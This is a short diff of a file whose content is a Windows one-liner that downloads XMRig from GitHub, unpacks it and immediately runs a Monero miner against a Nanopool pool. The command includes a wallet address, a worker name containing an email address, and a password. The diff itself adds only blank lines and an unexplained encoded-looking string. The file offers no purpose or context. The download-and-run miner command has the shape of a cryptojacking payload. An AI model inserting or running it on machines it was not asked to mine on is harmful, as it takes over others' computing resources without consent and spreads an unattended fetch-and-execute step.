@@ -1,1 +1,4 @@
 curl -O -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-win64.zip && tar -xf xmrig-6.16.4-win64.zip && cd xmrig-6.16.4 && .\xmrig.exe -o stratum+ssl://xmr-asia1.nanopool.org:14433 -u 496AJjjf5RTKZ9RgGa1DG6VnGL1BBWTCb7zgLrjbPD2JSbFCTSgANdTgvtuA9gttagW1mY45ANbNW4vh5jveGe4WUTrtbvL.ryz/yulramlan@gmail.com -p sianjing --tls --coin monero
+
+
+MB1GkvQCHuHWcDnxevpavAY5qs2DFEQcT5
